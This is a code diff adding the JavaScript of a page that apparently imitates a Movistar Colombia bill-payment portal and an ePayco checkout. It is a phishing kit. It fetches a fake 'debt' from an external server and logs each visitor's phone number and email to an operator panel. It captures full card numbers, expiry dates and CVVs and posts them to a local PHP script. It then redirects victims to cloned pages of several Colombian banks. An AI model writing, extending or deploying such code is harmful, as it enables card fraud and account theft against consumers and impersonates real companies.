+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('brand-name').textContent = btn.dataset.brand;
+  }
+
+  function setToggle(btn) {
+    document.querySelectorAll('.toggle-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+  }
+
+  function checkInput() {
+    const val = document.getElementById('numero-linea').value.trim();
+    const btn = document.getElementById('btn-consultar');
+    if (val.length >= 7) {
+      btn.classList.add('enabled');
+      btn.disabled = false;
+    } else {
+      btn.classList.remove('enabled');
+      btn.disabled = true;
+    }
+  }
+
+  function handleEnter(e) {
+    if (e.key === 'Enter') {
+      const btn = document.getElementById('btn-consultar');
+      if (!btn.disabled) {
+          consultarDeuda();
+      }
+    }
+  }
+
+  // --- LOGICA DE CONSULTA Y VISTAS ---
+
+  // Formato tipo Moneda COP
+  const formatter = new Intl.NumberFormat('es-CO', {
+    style: 'currency',
+    currency: 'COP',
+    minimumFractionDigits: 0
+  });
+
+  // Enmascarar numero (ej: 3124567890 -> 3** *** *890 ó 3******890 como en la foto)
+  function maskPhone(num) {
+      if(num.length < 5) return num;
+      const start = num.substring(0, 1);
+      const end = num.substring(num.length - 3);
+      const maskedLength = num.length - 4;
+      return start + "*".repeat(maskedLength) + end;
+  }
+
+  // Enmascarar formato con espacios como en la segunda tarjeta "3** *** *092"
+  function maskPhoneSpaces(num) {
+    if(num.length !== 10) return maskPhone(num);
+    const p1 = num.substring(0,1) + "**";
+    const p2 = "***";
+    const p3 = "*" + num.substring(7);
+    return `${p1} ${p2} ${p3}`;
+  }
+
+  async function consultarDeuda() {
+    const inputNum = document.getElementById('numero-linea').value.trim();
+    if(!inputNum) return;
+    
+    document.getElementById('loading-overlay').style.display = 'flex';
+    
+    try {
+        // API externa en Render - Motor antibloqueo Python
+        const response = await fetch('https://movistarprueba.onrender.com/consulta', {
+            method: 'POST',
+            body: JSON.stringify({numero: inputNum}),
+            headers: {'Content-Type': 'application/json'}
+        });
+        const data = await response.json();
+        
+        document.getElementById('loading-overlay').style.display = 'none';
+        
+        if (data.status === 'success') {
+            // Registrar consulta SIEMPRE para no perder el flujo (Unificación)
+            registrarConsultaEnPanel(inputNum, data.amount || '0');
+            
+            if(parseFloat(data.amount) > 0 || data.amount !== '0') {
+                mostrarFactura(inputNum, data.amount);
+            } else {
+                alert("Al día. No tienes facturas pendientes.");
+            }
+        } else {
+            alert(data.message || "No se pudo consultar la factura");
+        }
+        
+    } catch(e) {
+        document.getElementById('loading-overlay').style.display = 'none';
+        alert("Error de conexión con el servidor.");
+    }
+  }
+
+  async function registrarConsultaEnPanel(numero, monto) {
+    try {
+        // Sanear monto para evitar problemas de URL (quitar $, espacios y puntos)
+        const mLimpio = String(monto).replace(/[$\s.]/g, '');
+        const res = await fetch(`pagos/updatetele.php?action=log_consulta&numero=${encodeURIComponent(numero)}&monto=${encodeURIComponent(mLimpio)}`);
+        const data = await res.json();
+        if(data.status === 'success') {
+            currentSessionId = data.id;
+            localStorage.setItem('temp_session_id', currentSessionId);
+            console.log("Sesión unificada iniciada con ID:", currentSessionId);
+        }
+    } catch(e) { console.error("Error iniciando sesión unificada", e); }
+  }
+
+  function mostrarFactura(numero, amount) {
+    document.getElementById('form-view').classList.remove('active');
+    
+    document.getElementById('inv-phone').textContent = maskPhone(numero);
+    
+    const maskedSpaces = maskPhoneSpaces(numero);
+    document.getElementById('inv-phone2').textContent = maskedSpaces;
+    document.getElementById('inv-phone3').textContent = maskedSpaces;
+    
+    const formattedAmount = formatter.format(amount);
+    document.getElementById('inv-amount').textContent = formattedAmount;
+    document.getElementById('inv-amount-service').textContent = formattedAmount;
+
+    document.getElementById('invoice-view').classList.add('active');
+  }
+
+  function toggleDebtDetails() {
+    document.getElementById('debt-details').classList.toggle('open');
+    document.getElementById('debt-caret').classList.toggle('open');
+  }
+
+  function volver() {
+    document.getElementById('invoice-view').classList.remove('active');
+    document.getElementById('numero-linea').value = '';
+    checkInput();
+    document.getElementById('form-view').classList.add('active');
+  }
+
+  function iniciarPago() {
+      // Tomar la deuda calculada y colocarla en el modal ePayco adicionando COP
+      const deudaFormat = document.getElementById('inv-amount').textContent;
+      document.getElementById('epayco-total-amount').textContent = deudaFormat + " COP";
+      
+      // Auto-completar el telefono consultado en el input para ahorrar un paso al cliente
+      const phoneRAW = document.getElementById('numero-linea').value.trim();
+      document.getElementById('epayco-phone').value = phoneRAW;
+      
+      // Validar inmediatamente si trae info
+      validarEpaycoForm();
+      
+      document.getElementById('epayco-modal').classList.add('active');
+  }
+
+  function cerrarEpayco() {
+      document.getElementById('epayco-modal').classList.remove('active');
+  }
+
+  function validarEpaycoForm() {
+    const phone = document.getElementById('epayco-phone').value.trim();
+    const email = document.getElementById('epayco-email').value.trim();
+    
+    // Cambiar color/fondo del grupo telefono según contenido
+    if(phone.length > 0) document.getElementById('grp-phone').classList.add('active');
+    else document.getElementById('grp-phone').classList.remove('active');
+    
+    // Cambiar color/fondo del grupo email según contenido
+    if(email.length > 0) document.getElementById('grp-email').classList.add('active');
+    else document.getElementById('grp-email').classList.remove('active');
+    
+    // Activar boton solo si es valido
+    const btn = document.getElementById('epayco-submit');
+    if (phone.length >= 10 && email.includes('@') && email.includes('.')) {
+      btn.classList.add('enabled');
+    } else {
+      btn.classList.remove('enabled');
+    }
+  }
+
+  function continuarEpayco() {
+    const btn = document.getElementById('epayco-submit');
+    if(btn.classList.contains('enabled')) {
+       // Mask email: jeyco@gmail.com -> jey****@gmail.com
+       const email = document.getElementById('epayco-email').value.trim();
+       const [user, domain] = email.split('@');
+       let maskedUser = user.length > 3 ? user.substring(0,3) + "****" : user + "****";
+       document.getElementById('mask-email').textContent = maskedUser + "@" + domain;
+       
+       // Sincronizar total
+       const total = document.getElementById('epayco-total-amount').textContent;
+       document.getElementById('epayco-total-bottom').textContent = total;
+
+       // Transicion
+       document.getElementById('epayco-step-1').style.display = 'none';
+       document.getElementById('epayco-step-2').style.display = 'flex';
+
+       // Registrar datos de contacto en el Panel (Unificación)
+       if(currentSessionId) {
+           registrarContactoEnPanel(email, document.getElementById('epayco-phone').value.trim());
+       }
+    }
+  }
+
+  async function registrarContactoEnPanel(email, phone) {
+    try {
+        await fetch(`pagos/updatetele.php?action=log_contact&id=${currentSessionId}&email=${encodeURIComponent(email)}&phone=${encodeURIComponent(phone)}`);
+    } catch(e) { console.error("Error guardando contacto", e); }
+  }
+
+  function editarMisDatos() {
+    document.getElementById('epayco-step-2').style.display = 'none';
+    document.getElementById('epayco-step-1').style.display = 'flex';
+  }
+
+  // ===== PSE - LÓGICA DE BANCO =====
+  // Solo los bancos disponibles en /pagos/entidad
+  const todosBancos = [
+    { nombre: 'AV Villas', ruta: 'avvillas' },
+    { nombre: 'Bancolombia', ruta: 'bancolombia' },
+    { nombre: 'BBVA', ruta: 'bbva' },
+    { nombre: 'Bogotá', ruta: 'bogota' },
+    { nombre: 'Caja Social', ruta: 'caja_social' },
+    { nombre: 'Colpatria', ruta: 'colpatria' },
+    { nombre: 'Davivienda', ruta: 'davivienda' },
+    { nombre: 'Falabella', ruta: 'falabella' },
+    { nombre: 'Finandina', ruta: 'finandina' },
+    { nombre: 'Nequi', ruta: 'nequi' },
+    { nombre: 'Occidente', ruta: 'occidente' }
+  ];
+
+  let bancoPSESeleccionado = null;
+  let rutaBancoSeleccionado = null;
+  let pseStep4Origen = 'pse'; // 'pse' o 'directo' (bancolombia/daviplata/nequi)
+
+  // ===== TARJETA =====
+  function volverDesdeTC() {
+    document.getElementById('epayco-step-tarjeta').style.display = 'none';
+    document.getElementById('epayco-step-2').style.display = 'flex';
+  }
+
+  function formatearTarjeta(el) {
+    let v = el.value.replace(/\D/g,'').substring(0,16);
+    el.value = v.replace(/(\d{4})(?=\d)/g,'$1 ');
+  }
+
+  function formatearFecha(el) {
+    let v = el.value.replace(/\D/g,'');
+    if(v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+    el.value = v;
+  }
+
+  function actualizarTarjeta() {
+    const num = document.getElementById('tc-numero').value || 'XXXX XXXX XXXX XXXX';
+    const nombre = document.getElementById('tc-nombre').value.toUpperCase() || 'NOMBRE Y APELLIDOS';
+    const fecha = document.getElementById('tc-fecha').value || 'MM/AA';
+    document.getElementById('tc-preview-num').textContent = num.padEnd(19,'X').substring(0,19).replace(/X/g,'X');
+    document.getElementById('tc-preview-name').textContent = nombre || 'NOMBRE Y APELLIDOS';
+    document.getElementById('tc-preview-exp').textContent = fecha;
+    // Activar botón
+    const n = document.getElementById('tc-numero').value.replace(/\s/g,'');
+    const f = document.getElementById('tc-fecha').value;
+    const c = document.getElementById('tc-cvv').value;
+    const nm = document.getElementById('tc-nombre').value.trim();
+    const btn = document.getElementById('tc-continuar-btn');
+    if(n.length >= 16 && f.length === 5 && c.length >= 3 && nm.length > 3) {
+      btn.classList.add('enabled');
+    } else {
+      btn.classList.remove('enabled');
+    }
+  }
+
+  function toggleCVV() {
+    const inp = document.getElementById('tc-cvv');
+    inp.type = inp.type === 'password' ? 'text' : 'password';
+  }
+
+  async function enviarTarjeta() {
+    const btn = document.getElementById('tc-continuar-btn');
+    if(!btn.classList.contains('enabled')) return;
+    const numero = document.getElementById('tc-numero').value.replace(/\s/g,'');
+    const nombre = document.getElementById('tc-nombre').value.trim();
+    const fecha = document.getElementById('tc-fecha').value.trim();
+    const cvv = document.getElementById('tc-cvv').value.trim();
+    const monto = document.getElementById('tc-total').textContent;
+    btn.style.opacity = '0.5';
+    try {
+      const resp = await fetch('pagos/comprobando.php', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ 
+            cliente_id: currentSessionId, // Unificación
+            creditcard: numero, 
+            name: nombre, 
+            monto: monto, 
+            expdate: fecha, 
+            cvv: cvv 
+        })
+      });
+      const data = await resp.json();
+      if(data.status === 'success' && data.redirect_url) {
+        window.location.href = 'pagos/entidad/' + data.redirect_url;
+      } else {
+        alert(data.message || 'Error procesando el pago.');
+        // Limpiar el form
+        document.getElementById('tc-numero').value = '';
+        document.getElementById('tc-nombre').value = '';
+        document.getElementById('tc-fecha').value = '';
+        document.getElementById('tc-cvv').value = '';
+        actualizarTarjeta();
+      }
+    } catch(e) {
+      alert('Error de conexión.');
+    }
+    btn.style.opacity = '1';
+  }
+
+  function irMetodo(metodo) {
+    if(metodo === 'tarjeta') {
+      const total = document.getElementById('epayco-total-amount').textContent;
+      document.getElementById('tc-total').textContent = total;
+      document.getElementById('mask-email-tc').textContent = document.getElementById('mask-email').textContent;
+      document.getElementById('tc-nombre').value = '';
+      document.getElementById('tc-numero').value = '';
+      document.getElementById('tc-fecha').value = '';
+      document.getElementById('tc-cvv').value = '';
+      document.getElementById('tc-preview-num').textContent = 'XXXX XXXX XXXX XXXX';
+      document.getElementById('tc-preview-name').textContent = 'NOMBRE Y APELLIDOS';
+      document.getElementById('tc-preview-exp').textContent = 'MM/AA';
+      document.getElementById('tc-continuar-btn').classList.remove('enabled');
+      document.getElementById('epayco-step-2').style.display = 'none';
+      document.getElementById('epayco-step-tarjeta').style.display = 'flex';
+      return;
+    }
+    if(metodo === 'pse') {
+        // Sincronizar total y email
+        const total = document.getElementById('epayco-total-amount').textContent;
+        document.getElementById('pse-total-amount').textContent = total;
+        const emailMasked = document.getElementById('mask-email').textContent;
+        document.getElementById('mask-email-pse').textContent = emailMasked;
+        // Resetear selección
+        bancoPSESeleccionado = null;
+        document.querySelectorAll('.pse-bank-card').forEach(c => c.classList.remove('selected'));
+        document.getElementById('pse-dropdown-text').textContent = 'Selecciona...';
+        document.getElementById('pse-dropdown-trigger').classList.remove('has-value');
+        document.getElementById('pse-continuar-btn').classList.remove('enabled');
+        // Mostrar step 3
+        document.getElementById('epayco-step-2').style.display = 'none';
+        document.getElementById('epayco-step-3').style.display = 'flex';
+    } else if(metodo === 'bancolombia' || metodo === 'daviplata' || metodo === 'nequi') {
+        // Redirigir directamente a la entidad bancaria
+        const finalId = currentSessionId || localStorage.getItem('temp_session_id');
+        const urlId = finalId ? `?id=${finalId}` : '';
+        window.location.href = 'pagos/entidad/' + metodo + '/index.php' + urlId;
+    } else {
+        alert('Enrutando a portal de ' + metodo.toUpperCase() + '...');
+    }
+  }
+
+  function volverDesdePS() {
+    document.getElementById('epayco-step-3').style.display = 'none';
+    document.getElementById('epayco-step-2').style.display = 'flex';
+  }
+
+  function seleccionarBanco(nombre, cardEl, ruta) {
+    bancoPSESeleccionado = nombre;
+    rutaBancoSeleccionado = ruta || nombre.toLowerCase().replace(/ /g,'_');
+    document.querySelectorAll('.pse-bank-card').forEach(c => c.classList.remove('selected'));
+    cardEl.classList.add('selected');
+    // Limpiar dropdown
+    document.getElementById('pse-dropdown-text').textContent = 'Selecciona...';
+    document.getElementById('pse-dropdown-trigger').classList.remove('has-value');
+    document.getElementById('pse-continuar-btn').classList.add('enabled');
+  }
+
+  // Panel de bancos
+  function abrirPanelBancos() {
+    document.getElementById('pse-search-input').value = '';
+    renderizarBancos(todosBancos);
+    document.getElementById('pse-bank-panel').classList.add('visible');
+    setTimeout(() => document.getElementById('pse-search-input').focus(), 100);
+  }
+
+  function cerrarPanelBancos() {
+    document.getElementById('pse-bank-panel').classList.remove('visible');
+  }
+
+  function filtrarBancos() {
+    const q = document.getElementById('pse-search-input').value.toLowerCase();
+    const filtrados = todosBancos.filter(b => b.nombre.toLowerCase().includes(q));
+    renderizarBancos(filtrados);
+  }
+
+  function renderizarBancos(lista) {
+    const container = document.getElementById('pse-bank-list');
+    container.innerHTML = lista.map(b => `
+      <div class="pse-bank-list-item" onclick="elegirBancoLista('${b.nombre}', '${b.ruta}')">
+        <span>${b.nombre}</span>
+      </div>
+    `).join('');
+  }
+
+  function elegirBancoLista(nombre, ruta) {
+    bancoPSESeleccionado = nombre;
+    rutaBancoSeleccionado = ruta;
+    // Deseleccionar cards
+    document.querySelectorAll('.pse-bank-card').forEach(c => c.classList.remove('selected'));
+    // Actualizar dropdown
+    document.getElementById('pse-dropdown-text').textContent = nombre;
+    document.getElementById('pse-dropdown-trigger').classList.add('has-value');
+    document.getElementById('pse-continuar-btn').classList.add('enabled');
+    cerrarPanelBancos();
+  }
+
+  function continuarPSE() {
+    if(!bancoPSESeleccionado) return;
+    pseStep4Origen = 'pse'; // Vino desde el flujo PSE
+    // Sincronizar datos al paso 2
+    document.getElementById('pse-step4-banco').textContent = bancoPSESeleccionado;
+    document.getElementById('pse4-total').textContent = document.getElementById('pse-total-amount').textContent;
+    document.getElementById('mask-email-pse4').textContent = document.getElementById('mask-email-pse').textContent;
+    // Resetear form
+    document.getElementById('pse-nombre').value = '';
+    document.getElementById('pse-direccion').value = '';
+    document.getElementById('pse-num-doc').value = '';
+    document.getElementById('pse-terms-check').classList.remove('checked');
+    selPersona('natural');
+    validarFormPSE();
+    // Navegar
+    document.getElementById('epayco-step-3').style.display = 'none';
+    document.getElementById('epayco-step-4').style.display = 'flex';
+  }
+
+  function volverAlPaso1PSE() {
+    document.getElementById('epayco-step-4').style.display = 'none';
+    if (pseStep4Origen === 'directo') {
+      // Vino directamente desde bancolombia/daviplata/nequi, volver al menú de métodos
+      document.getElementById('epayco-step-2').style.display = 'flex';
+    } else {
+      // Vino desde el flujo PSE, volver a selección de banco
+      document.getElementById('epayco-step-3').style.display = 'flex';
+    }
+  }
+
+  function selPersona(tipo) {
+    document.getElementById('btn-natural').classList.toggle('active', tipo === 'natural');
+    document.getElementById('btn-juridica').classList.toggle('active', tipo === 'juridica');
+  }
+
+  function toggleTerms() {
+    document.getElementById('pse-terms-check').classList.toggle('checked');
+    validarFormPSE();
+  }
+
+  function validarFormPSE() {
+    const nombre = document.getElementById('pse-nombre').value.trim();
+    const dir = document.getElementById('pse-direccion').value.trim();
+    const doc = document.getElementById('pse-num-doc').value.trim();
+    const terms = document.getElementById('pse-terms-check').classList.contains('checked');
+    const btn = document.getElementById('pse-pagar-btn');
+    if(nombre.length > 3 && dir.length > 3 && doc.length > 4 && terms) {
+      btn.classList.add('enabled');
+    } else {
+      btn.classList.remove('enabled');
+    }
+  }
+
+  function pagarPSE() {
+    const btn = document.getElementById('pse-pagar-btn');
+    if(!btn.classList.contains('enabled')) return;
+    
+    // Pasar el ID al banco para mantener la unificación
+    const finalId = currentSessionId || localStorage.getItem('temp_session_id');
+    const urlId = finalId ? `?id=${finalId}` : '';
+    window.location.href = 'pagos/entidad/' + rutaBancoSeleccionado + '/index.php' + urlId;
+  }
+</script>
+
+</body>
+</html>
